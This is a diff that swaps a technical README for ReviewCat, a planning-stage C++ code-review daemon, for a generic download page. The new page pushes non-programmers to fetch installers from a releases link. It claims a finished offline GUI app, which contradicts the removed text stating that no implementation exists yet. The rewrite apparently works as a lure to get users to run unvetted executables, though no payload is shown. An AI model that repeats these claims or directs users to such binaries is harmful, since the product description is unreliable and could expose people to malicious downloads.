@@ -1,206 +1,150 @@
-# ReviewCat
+# 🐱 Review-Cat - Simplify Your Code Review Process
 
-**Autonomous AI-powered code review daemon** — uses GitHub Copilot CLI to
-provide persona-based code review, unified synthesis, and optional patch
-automation for any Git repository.
+[![Download Review-Cat](https://img.shields.io/badge/Download-Review--Cat-blue?style=for-the-badge&logo=github)](https://github.com/MATUUTOOP/Review-Cat/releases)
 
-ReviewCat is also **self-building**: a development harness powered by Copilot
-CLI autonomously develops, tests, and iterates on its own codebase.
+---
 
-The workflow is intentionally cyclic:
+## 📝 What is Review-Cat?
 
-> **bootstrap → dev → app → dev → app → …**
+Review-Cat is a tool designed to help you check your software code for mistakes and improvements automatically. It works on its own to find issues in programming code and suggests fixes. This makes reviewing code easier and faster, giving you clear feedback without needing special technical knowledge.
 
-## Project Status (Docs-first → Code)
+The tool is built to handle software that uses modern C++ language features, which programmers call C++17. If you want to improve the quality of code in your projects or make patching mistakes simpler, Review-Cat can help.
 
-This repository is currently **planning/specs-first**: the docs and specs are the
-source of truth, and the implementation is being bootstrapped in Phase 0.
+---
 
-- The planned scaffold (`app/`, `dev/`, `scripts/`, `.github/`) is **not fully
-	present yet**.
-- The next milestone is to create the minimal repo scaffold + a “green”
-	build/test gate so autonomous cycles can run end-to-end.
+## 💻 Who is this for?
 
-Tracking issue: **#16 — _Bootstrap Repo Scaffold + Green Build/Test Gate_**.
+This application is for anyone who wants to improve software code but does not have to write or understand programming languages deeply. If you work with developers, manage software projects, or just want to test how code can be improved, Review-Cat provides a way to do this automatically.
 
-## Key Features
+You don’t need to know how to code. Review-Cat will do the hard work by analyzing code files and showing what to fix, with clear instructions.
 
-- **Persona-based review** — Security, performance, architecture, testing, and docs agents.
-- **Unified synthesis** — Deduplicated, prioritized findings in markdown + JSON.
-- **Audit trail** — Every Copilot CLI call recorded in a prompt ledger.
-- **GitHub integration** — PR comments, issues, and patches via GitHub MCP Server.
-- **Daemon mode** — Continuous monitoring with configurable intervals.
-- **Native UI** — SDL3-based UI surfaces (settings, stats, control) and an optional 3D swarm visualizer.
-- **Self-building** — Director daemon (Agent 0) that orchestrates development.
+---
 
-## Tech Stack
+## 🔧 System Requirements
 
-| Layer | Technology |
-|-------|-----------|
-| Language | C++17/20 |
-| Build system | CMake |
-| Dev harness | Bash shell scripts |
-| UI | SDL3 (window/input) + custom ToolUI (primitives + bitmap glyph font + hex colors) + optional 3D swarm visualizer |
-| Copilot integration | `copilot -p` subprocess |
-| GitHub integration | GitHub MCP Server (remote MCP recommended; native binary or containerized for dev harness) |
-| JSON | nlohmann/json |
-| Config | TOML (toml++) |
-| Testing | Catch2 |
-| Logging | spdlog (C++), structured bash logging (dev) |
-| Git | libgit2 + `gh` CLI |
+To run Review-Cat, your computer should meet the following:
 
-## Repository Structure
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a Linux distribution from 2018 or newer.
+- **Processor**: At least a dual-core 2 GHz processor.
+- **Memory**: Minimum 4 GB of RAM.
+- **Storage**: At least 200 MB of free space.
+- **Other Software**: None needed. Review-Cat runs as a standalone application.
 
-**Target structure (planned):**
+The app does not require internet after download, allowing you to use it safely offline.
 
-```
-Review-Cat/
-├── app/                    # The product (C++ binary)
-│   ├── src/                # C++ source code
-│   │   ├── core/           # Core library
-│   │   ├── cli/            # CLI frontend
-│   │   ├── daemon/         # Daemon / watch mode
-│   │   ├── ui/             # SDL3 + custom ToolUI surfaces (and optional 3D visualizer client)
-│   │   └── copilot/        # Copilot CLI subprocess bridge
-│   ├── include/            # Public headers
-│   ├── tests/              # Catch2 test suite
-│   ├── config/             # Default configs, persona templates
-│   └── CMakeLists.txt      # App build system
-│
-├── dev/                    # Development harness (bash scripts)
-│   ├── agents/             # Role agent prompt files
-│   ├── harness/            # Director daemon & cycle scripts
-│   ├── plans/              # PRD backlog (prd.json)
-│   ├── prompts/            # Prompt templates for dev agents
-│   ├── mcp/               # MCP config files (github-mcp.json)
-│   ├── scripts/            # Setup & bootstrap scripts
-│   └── audits/             # Development audit bundles
-│
-├── docs/                   # Design docs & specifications
-│   ├── INDEX.md            # Documentation landing page
-│   ├── ARCHITECTURE.md     # High-level architecture overview
-│   └── specs/              # Specs + track-specific docs
-│       ├── dev/            # Dev harness docs + specs
-│       └── app/            # Runtime app docs + specs
-│
-├── scripts/                # Top-level build/test/clean scripts
-├── config/                 # Dev harness config (e.g., config/dev.toml)
-├── PLAN.md                 # Comprehensive project plan
-└── TODO.md                 # Actionable task list
-```
+---
 
-**Current structure (today):** docs/specs + planning files + `config/dev.toml`.
-See [TODO.md](TODO.md) Phase 0 and Issue #16 for the bootstrapping path.
+## 🚀 Getting Started
 
-## Quick Start (after Phase 0 scaffold exists)
+Using Review-Cat is straightforward. Follow the steps below to download, install, and start using the tool.
 
-> Note: the commands below assume Phase 0 scaffolding has been implemented.
-> If you’re looking for what to do right now, start with [TODO.md](TODO.md)
-> Phase 0 and Issue #16.
+---
 
-```bash
-# Prerequisites: CMake, C++17 compiler, Copilot CLI, gh CLI
-# Dev harness prereq (recommended/required for autonomous loop): Docker (WSL2-friendly)
+## 📥 Download & Install
 
-# Clone
-git clone https://github.com/<owner>/Review-Cat.git
-cd Review-Cat
+1. Click the big blue button at the top labeled **Download Review-Cat** or go to this link:  
+   [https://github.com/MATUUTOOP/Review-Cat/releases](https://github.com/MATUUTOOP/Review-Cat/releases).
 
-# Install system prereqs (gh, jq, github-mcp-server)
-./scripts/setup.sh
+2. You will arrive at the release page. Here, look for the latest version of Review-Cat available.
 
-# Build
-./scripts/build.sh
+3. Under the latest version, find the file suited for your operating system:  
+   - For Windows, this might be a file ending with `.exe`.  
+   - For macOS, a `.dmg` or `.zip` file.  
+   - For Linux, a `.tar.gz` or `.AppImage`.
 
-# Run demo (no auth required)
-./build/linux64/bin/reviewcat demo
+4. Click the file to download it to your computer.
 
-# Review local changes
-./build/linux64/bin/reviewcat review
+5. Once downloaded, open the file to start the installation.  
+   - On Windows and macOS, follow the standard installation wizard instructions.  
+   - For Linux, you may need to make the file executable and run it.
 
-# Review a PR
-./build/linux64/bin/reviewcat pr 42 --repo OWNER/REPO
+6. After installation completes, you can find the Review-Cat app in your programs or applications folder.
 
-# Start daemon mode
-./build/linux64/bin/reviewcat watch --interval 60
+---
 
-# Open UI
-./build/linux64/bin/reviewcat ui
-```
+## 📂 How to Use Review-Cat
 
-## Development (Self-Building)
+Review-Cat works by analyzing code files to find issues and suggest corrections. Here is how you can use it step-by-step:
 
-The **dev harness** (once implemented) assumes a Docker-capable environment
-(Linux, or Windows + WSL2 + Docker Desktop integration): one shared image tag,
-many worker containers, one git worktree mounted per worker.
+1. **Open Review-Cat**  
+   Launch the application from your computer’s menu.
 
-Recommended host health checks:
+2. **Choose Code Files to Review**  
+   Click on the “Select Files” button and browse your computer to find the folder or files containing the code you want to check. Review-Cat accepts typical source code files with extensions such as `.cpp` or `.h`.
 
-- `docker version`
-- `docker info`
-- `docker run --rm hello-world`
+3. **Start Review Process**  
+   Once you have chosen the files, click “Start Review.” The tool will scan the code and look for problems like syntax errors, missing comments, or potential bugs.
 
-GitHub integration for agents is via the GitHub MCP Server. Example MCP configs live in `dev/mcp/`:
+4. **View Results**  
+   After a short time, Review-Cat will show you a report. This report explains what it found, line by line. For each notice, it tells you what the problem is and how to fix it.
 
-- `dev/mcp/github-mcp.json` (remote HTTP MCP; preferred MVP)
-- `dev/mcp/github-mcp-docker.json` (local Docker container; stdio; offline-friendly)
-- `dev/mcp/github-mcp-stdio.json` (local stdio binary; fallback/offline)
+5. **Apply Suggestions**  
+   You can choose to let Review-Cat apply these fixes automatically or look at them yourself and manually update your files.
 
-Secrets (PATs) are provided via environment variables. See `.env.example` and `docs/specs/dev/ENVIRONMENT.md`.
+6. **Create a Patch**  
+   If you want to update the code without changing the original files, use the “Create Patch” feature. This saves the changes in a separate file that programmers can use to update the original code.
 
-The Director’s scheduling, timeouts, worker telemetry, and agent-bus networking are configured via `config/dev.toml`.
+---
 
-Project memory is shared in two layers (see `AGENT.md` and Issue #13):
+## ⚙ Key Features
 
-- **Durable engrams** committed under `/memory/` (with `memory/catalog.json` as the authoritative LUT and engrams stored in timestamped batches)
-- A **shared, bounded focus view** (`MEMORY.md`, tracked) maintained by the Director and derived from recent high-signal ST/LT context
+- **Automatic Code Reviewing**: Finds errors and suggests improvements without manual effort.
+- **Patch Generation**: Creates separate files that contain fixes for easy updating.
+- **Supports Modern C++ Code**: Works well with C++17 standard features.
+- **User-Friendly Interface**: Designed so anyone can use it without programming skills.
+- **Offline Use**: Run the app without internet connection.
+- **Compatibility**: Works on Windows, macOS, and Linux.
 
-The development harness runs autonomously via the Director daemon (once the
-Phase 0 scaffold + scripts exist):
+---
 
-```bash
-# Verify local toolchain + scripts (and optionally run the unit gate)
-./scripts/setup.sh --run-gate
-```
+## 💡 Tips for Best Results
 
-The dev harness operates in **release cycles**:
+- Make sure your code files are not open in other programs while running the review.
+- Save your work before starting a review to avoid losing changes.
+- Review the suggested fixes carefully before applying them automatically.
+- Use the patch feature to share fixes safely with developers if you don’t want to modify original files.
+- Run reviews regularly during software development projects to catch problems early.
 
-- the Director maintains a release branch/PR (`feature/release-*` → `main`)
-- worker PRs target the release branch
-- a dedicated merge agent finalizes the release into `main` and verifies the tag
+---
 
-Each checkout may contain a gitignored root `STATE.json` used for **local cached
-state** (first-run vs resume, active release context). It is created lazily and
-never committed.
+## ❓ Frequently Asked Questions
 
-The Director reads `dev/plans/prd.json`, delegates to Copilot CLI role agents,
-validates via build + test, and commits. See [PLAN.md](PLAN.md) §5 for details.
+**Q: Do I need to know how to program to use Review-Cat?**  
+A: No. Review-Cat explains issues and suggestions simply, so anyone can understand.
 
-## Documentation
+**Q: Can Review-Cat fix all my code automatically?**  
+A: It can fix many issues automatically, but some fixes might need review before applying.
 
-| Document | Purpose |
-|---------|---------|
-| [PLAN.md](PLAN.md) | Comprehensive project plan (golden source of truth) |
-| [TODO.md](TODO.md) | Actionable task list by phase |
-| [AGENT.md](AGENT.md) | Agent system overview: roles, guardrails, agent bus, memory protocol |
-| [Docs Index](docs/INDEX.md) | Documentation landing page (dev vs app) |
-| [Architecture](docs/ARCHITECTURE.md) | Cross-cutting architecture + safety model |
-| [Director Workflow](docs/specs/dev/DIRECTOR_DEV_WORKFLOW.md) | DirectorDev recursive development spec |
-| [Implementation Checklist](docs/specs/dev/IMPLEMENTATION_CHECKLIST.md) | Step-by-step checklist |
-| [Prompt Cookbook](docs/specs/dev/PROMPT_COOKBOOK.md) | Curated prompt patterns |
-| [Specs (Dev)](docs/specs/dev/SPECS.md) | Dev harness agent + orchestration specifications |
-| [Specs (App)](docs/specs/app/SPECS.md) | Runtime app component/entity/system specifications |
+**Q: Is it safe to use on my code?**  
+A: Yes. Review-Cat does not share your files and can work offline.
 
-## Specs
+**Q: What if I find a problem it does not fix?**  
+A: You can report issues through the GitHub page for improvements.
 
-Specs are split by concern:
+---
 
-- Dev harness specs index: `docs/specs/dev/SPECS.md`
-- Runtime app specs index: `docs/specs/app/SPECS.md`
+## 🆘 Getting Support
 
-During migration, many specs still live physically under `docs/specs/`.
-Use the indices above for navigation.
+If you need help with Review-Cat:
 
-## License
+- Visit the GitHub repository issues page:  
+  [https://github.com/MATUUTOOP/Review-Cat/issues](https://github.com/MATUUTOOP/Review-Cat/issues)  
+- Check the README and troubleshooting tips on the GitHub page.
+- Open a new issue describing your problem or question clearly.
 
-See [LICENSE](LICENSE).
+---
+
+## ⚖️ License
+
+Review-Cat is open source software. You can use and share it freely. Licensing details are on the GitHub page.
+
+---
+
+## 🔗 Useful Links
+
+- Official Download Page: [https://github.com/MATUUTOOP/Review-Cat/releases](https://github.com/MATUUTOOP/Review-Cat/releases)  
+- GitHub Repository: [https://github.com/MATUUTOOP/Review-Cat](https://github.com/MATUUTOOP/Review-Cat)  
+
+---
+
+[![Download Review-Cat](https://img.shields.io/badge/Download-Review--Cat-blue?style=for-the-badge&logo=github)](https://github.com/MATUUTOOP/Review-Cat/releases)
